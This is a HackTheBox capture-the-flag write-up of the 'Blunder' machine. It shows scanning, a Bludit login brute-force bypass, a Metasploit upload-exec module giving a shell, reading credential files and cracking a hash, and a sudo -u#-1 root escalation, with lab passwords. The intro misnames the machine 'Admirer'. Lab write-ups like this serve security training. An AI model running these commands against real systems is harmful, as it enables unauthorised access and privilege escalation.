@@ -1,0 +1,138 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
+            <h1 class="post-title entry-title">Blunder HackTheBox Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/blunder-hackthebox-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2021-02-03T06:54:51+00:00">February 3, 2021</time><time class="updated" datetime="2025-06-23T09:12:21+00:00">June 23, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Today we are going to crack a machine called Admirer. It was created by <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://twitter.com/whortonmr?lang=en">egotisticalSW</a></strong></span>. This is a Capture the Flag type of challenge. This machine is hosted on HackTheBox. Let’s get cracking!</span></p>
+<h3><span style="color: #800000;"><strong>Penetration Testing Methodology</strong></span></h3>
+<ul>
+<li><span style="color: #000000;"><strong>Network Scanning</strong></span>
+<ul>
+<li><span style="color: #000000;">Nmap Scan</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Enumeration</strong></span>
+<ul>
+<li><span style="color: #000000;">Browsing HTTP Service</span></li>
+<li><span style="color: #000000;">Directory Bruteforce using gobuster</span></li>
+<li><span style="color: #000000;">Enumerating Usernames</span></li>
+<li><span style="color: #000000;">Crafting dictionary using Cewl</span></li>
+<li><span style="color: #000000;">Using Exploit to bypass Bruteforce Restriction on Bludit</span></li>
+<li><span style="color: #000000;">Getting Login Credentials</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Exploitation</strong></span>
+<ul>
+<li><span style="color: #000000;">Exploiting Remote Command Execution</span></li>
+<li><span style="color: #000000;">Enumerating user files</span></li>
+<li><span style="color: #000000;">Getting username and hash for Hugo user</span></li>
+<li><span style="color: #000000;">Cracking Hash</span></li>
+<li><span style="color: #000000;">Reading User Flag</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Privilege Escalation</strong></span>
+<ul>
+<li><span style="color: #000000;">Enumerating Sudo Permissions</span></li>
+<li><span style="color: #000000;">Enumerating Sudo Version</span></li>
+<li><span style="color: #000000;">Bypassing Sudo Restriction</span></li>
+<li><span style="color: #000000;">Reading Root Flag</span></li>
+</ul>
+</li>
+</ul>
+<h3><span style="color: #800000;"><strong>Walkthrough</strong></span></h3>
+<h3><span style="color: #800000;"><strong>Network Scanning</strong></span></h3>
+<p><span style="color: #000000;">To Attack any machine, we need the IP Address. Machine hosted on HackTheBox have a static IP Address.</span></p>
+<p><span style="color: #000000;"><strong>IP Address assigned: 10.129.74.213</strong></span></p>
+<p><span style="color: #000000;">Now that we have the IP Address. We need to enumerate open ports on the machine. For this, we will be running a nmap scan.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -sC -sV 10.129.74.213</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-bWvuIKYEGWk/YBpEIQJ-cjI/AAAAAAAAtZk/97jUvEP3lEoTF80F8J8Oybl2YyxK2l70gCLcBGAsYHQ/s16000/1.png"/></span></p>
+<p><span style="color: #000000;">The Nmap Version scan quickly gave us some great information. It positively informed that the following ports and services are running: 21 (FTP) and 80 (HTTP).</span></p>
+<h3><span style="color: #800000;"><strong>Enumeration</strong></span></h3>
+<p><span style="color: #000000;">We started our Enumeration with the HTTP Service. We ran the browser and opened the IP Address of the machine.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-8jKGp_CCI-Q/YBpEtjYUR3I/AAAAAAAAtZs/AaYi6kFjNXM30pl0vcRBiJfTJGrrFiRMgCLcBGAsYHQ/s16000/2.png"/></span></p>
+<p><span style="color: #000000;">It looks like a blog of some sort. There isn’t much to go on from the webpage itself. We tried to enumerate some information from the source code but there was nothing of any significance there as well. Time to take out the Big Guns and do a Directory Bruteforce.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">gobuster dir --url  http://10.129.74.213/ -w /usr/share/wordlists/dirb/big.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-79dcTNapkZc/YBpEyhc2DXI/AAAAAAAAtZw/o6kJ7SFsa58r0S7XN8fyWaaoThGH5g_qACLcBGAsYHQ/s16000/3.png"/></span></p>
+<p><span style="color: #000000;">The gobuster took very little time to find the /admin directory. It got a redirection to it as can been seen in the scan image above. We decided to take a look at the /admin directory through web browser but there seems to be some error that’s preventing the page to load properly. We added hostname for the machine in our local /etc/hosts file as shown in the image below.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-QloEXVVMw04/YBpE8u8_GOI/AAAAAAAAtZ0/-WlFq_jPmxo5aEBvjvV37WDa1K1aMXi9QCLcBGAsYHQ/s16000/4.png"/></span></p>
+<p><span style="color: #000000;">This time the page loads with ease and we see a normal login page with a standard username and password fields and a submit button. But it does say Bludit. Bludit is a lightweight CMS that is similar to WordPress.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-OLdzmpFOmxs/YBpFCoARMoI/AAAAAAAAtaA/hUqlKf-SAooPVVYBqA5UPzBwfN55paq5gCLcBGAsYHQ/s16000/5.png"/></span></p>
+<h4><span style="color: #000000;">Finding Credential Clues</span></h4>
+<p><span style="color: #000000;">But this seems another dead-end as we don’t have the credentials. We can try and Bruteforce it but we know that’s not the way things are supposed to be done. Also, Bludit CMS have an Anti-Bruteforce Mechanism. So, a direct Bruteforce or dictionary attack are worthless. It means that we are missing something, hence time to enumerate more. We do another directory Bruteforce using the gobuster but this time we added the extension .txt.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">gobuster dir --url  http://10.129.74.213/ -w /usr/share/wordlists/dirb/big.txt -x .txt -s 200</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-x_GwzqT7fGY/YBpFGbYjXhI/AAAAAAAAtaE/lGQAZ5SeocIFEPkgaTrnrTQshDb0wHofQCLcBGAsYHQ/s16000/6.png"/></span></p>
+<p><span style="color: #000000;">The scan gave us robots.txt and /todo.txt. As todo.txt seemed more interesting, we decided to take a look at it.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-YsRTu3-65J0/YBpFKpuctuI/AAAAAAAAtaI/oWuG7_Y8VeEajc88Jh1TyfvISqSPewVqwCLcBGAsYHQ/s16000/7.png"/></span></p>
+<p><span style="color: #000000;">This is probably why administrators should keep their to-do list private. There are a couple of things to notice here. Firstly, it says that CMS is to be updated. This might mean that the Bludit CMS currently deployed might have some vulnerabilities. Also, it gives us a probable username “Fergus”. We are still at the loss for the password for the login. We decided to perform a dictionary attack but in order to create a dictionary for the user Fergus, we used cewl to crawl through the webpages and pick words and put them in a dictionary.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cewl http://10.129.74.213/ -w dict.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-zMvB5aZNT7s/YBpFXBxuMlI/AAAAAAAAtaY/hZryU-1SgVQs-862rlAGhUKpIYTKGh6BgCLcBGAsYHQ/s16000/8.png"/></span></p>
+<p><span style="color: #000000;">Now, we got into the search for that Bludit vulnerability that might help us get into the machine. It didn’t take us long to find that the deployed Bludit CMS is vulnerable to Authentication Bruteforce Mitigation Bypass. Exploit DB has an exploit in Ruby, but I did some more digging and found a python payload for the same. Detailed post available <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://rastating.github.io/bludit-brute-force-mitigation-bypass/">here</a></strong></span>. We got the python script, now we need to configure the variables with the IP address, Username and the dictionary we created before with Cewl.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-lgi8FAyYR-o/YBpFbpzUTqI/AAAAAAAAtag/-gVHLGuxvjgdGvTB2PV0wVAI9lHcznIeACLcBGAsYHQ/s16000/9.png"/></span></p>
+<p><span style="color: #000000;">After running the script, we found the legit credentials for the user Fergus.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-gZpsvfr4oRE/YBpFlFlTTUI/AAAAAAAAtak/y_7x80PeIEcASBQzniJSrEzSEbHvMZTJgCLcBGAsYHQ/s16000/10.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Exploitation</strong></span></h3>
+<p><span style="color: #000000;">Now that we have the credentials, we can either try and login into the web client or we can go back to that to-do list. It said that user Fergus user has something to do with the images on the blog. This means it is possible that Fergus user is in-charge for the Image upload on the blog. Also, we did some digging on the Bludit CMS and found that it has a Code Execution Vulnerability in the Upload Function. It can easily be found on the Bludit Documentation <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://github.com/bludit/bludit/issues/1081">here</a></strong></span>.  </span></p>
+<p><span style="color: #000000;">We tried to look an exploit in the Metasploit and found one. It is called “bludit_upload_images_exec”. Now after selecting we check the options for the exploit. It required Target IP Address, Local Host (Make sure to provide the VPN host), Username and Password. As we have enumerated all, we executed the payload, we get a meterpreter session on the target machine. Now time to look for the user flag. The user flag is not accessible from www-data. The user flag is inside the hugo user home directory. Also, it is only readable with that user. It means we need to get the access of the Hugo user.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/linux/http/Bludit_upload_images_exec
+set rhosts 10.129.74.213
+set lhost tun0
+set BLUDITUSER Fergus
+set BLUDITPASS RolandDeschain
+exploit
+sysinfo
+shell
+python -c "import pty;pty.spawn('/bin/bash')"
+cd /var/www/Bludit-3.9.2/bl-content/databases
+cat users.php</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-OOscedDMT3g/YBpF8sxkUsI/AAAAAAAAta0/OvuXjZVmQtM0Somc24hlBNgqAUE04hd0gCLcBGAsYHQ/s16000/13.png"/></span></p>
+<p><span style="color: #000000;">After further enumeration into the Bludit directories, we found another user.php file. This time it has the username and password hash of the user Hugo.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /var/www/
+cd bludit-3.10.0a
+cd bl-content
+cd databases
+cat users.php</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ZuBZKPLW9uo/YBpGJBFWPxI/AAAAAAAAta8/K4dEbIiBCdYeBuZFP_4qyG3u2miVDhEogCLcBGAsYHQ/s16000/14.png"/></span></p>
+<p><span style="color: #000000;">Analysing the Hash, we found that it is SHA-1. Lucky for us, SHA-1 can be reverse searched online using a bunch of tools available. The password came out to be Password120.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/--p9d8aXK-6M/YBpGRehpXNI/AAAAAAAAtbE/45V7XRT8zOg-KOk-gfcW6u9xosEM_pnZQCLcBGAsYHQ/s16000/15.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Privilege Escalation</strong></span></h3>
+<p><span style="color: #000000;">We logged into the hugo user using su hugo. Time to take a look at that user flag. Now that we have completed the user exploitation, it’s time for us to elevate those privileges and get the root flag. Enumerating sudo permissions, we see that we have the permission to run the bash as any user except root. That restricts us running root bash, it is possible that such restriction can be bypassed by a vulnerability. To check for sudo vulnerability, we check the sudo version. It is version 1.8.25p1.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">su hugo
+Password120
+cd /home/hugo
+cat user.txt
+sudo -l
+sudo -V</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-DeFTut3dgWo/YBpGXDyPhiI/AAAAAAAAtbI/R32FxXyt0ZYYxLe2R9Mb2clzpgcZBA-QQCLcBGAsYHQ/s16000/16.png"/></span></p>
+<p><span style="color: #000000;">We searched vulnerabilities on exploit DB and found this version is vulnerable to a restriction bypass. All it takes is crafting the sudo /bin/bash command in a specific way depicted on the <strong><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.exploit-db.com/exploits/47502">exploit DB page</a></span></strong> as shown below.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-tbtTpqwjp34/YBpGeFYf14I/AAAAAAAAtbQ/MvaVHuUFELc3Mq-yfXSryG76a34NiSzGgCLcBGAsYHQ/s16000/17.png"/></span></p>
+<p><span style="color: #000000;">We ran the command and we got root shell. We just have to read the root flag and then we are done.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo -u#-1 /bin/bash
+cd /root
+cat root.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-dSarRTtSY7k/YBpGjzqBhjI/AAAAAAAAtbY/w5H7D0nKfPAQRlnZiW3M2VSs2GrkIHRTwCLcBGAsYHQ/s16000/18.png"/></span></p>
+<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
+<p><span style="color: #000000;"><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher, and Penetration Tester. Contact on <span style="color: #0000ff;"><strong>Twitter</strong> </span>and <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.linkedin.com/in/pavan2318/">LinkedIn</a></strong></span></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
+<!-- YARPP Thumbnails -->
+<h3>Related posts:</h3>
+<div class="yarpp-thumbnails-horizontal">
+<a class="yarpp-thumbnail" rel="norewrite" href="https://www.hackingarticles.in/previse-hackthebox-walkthrough/" title="Previse HackTheBox Walkthrough">
+<span class="yarpp-thumbnail-default"><img src="https://www.hackingarticles.in/wp-content/plugins/yet-another-related-posts-plugin/images/default.png" alt="Default Thumbnail" data-pin-nopin="true"/></span><span class="yarpp-thumbnail-title">Previse HackTheBox Walkthrough</span></a>
+<a class="yarpp-thumbnail" rel="norewrite" href="https://www.hackingarticles.in/horizontall-hackthebox-walkthrough/" title="Horizontall HackTheBox Walkthrough">
+<span class="yarpp-thumbnail-default"><img src="https://www.hackingarticles.in/wp-content/plugins/yet-another-related-posts-plugin/images/default.png" alt="Default Thumbnail" data-pin-nopin="true"/></span><span class="yarpp-thumbnail-title">Horizontall HackTheBox Walkthrough</span></a>
+</div>
+</div>
+            </div><!-- .entry-content -->
+            <footer class="post-footer entry-footer">
+                                                
+            </footer><!-- .entry-footer -->
+            
+	<nav class="navigation post-navigation" aria-label="Posts">
+		<h2 class="screen-reader-text">Post navigation</h2>
+		<div class="nav-links"><div class="nav-previous"><a href="https://www.hackingarticles.in/thick-client-penetration-testing-information-gathering/" rel="prev">Thick Client Penetration Testing: Information Gathering</a></div><div class="nav-next"><a href="https://www.hackingarticles.in/android-penetration-testing-apk-reverse-engineering/" rel="next">Android Penetration Testing: Apk Reverse Engineering</a></div></div>
+	</nav>        </div>
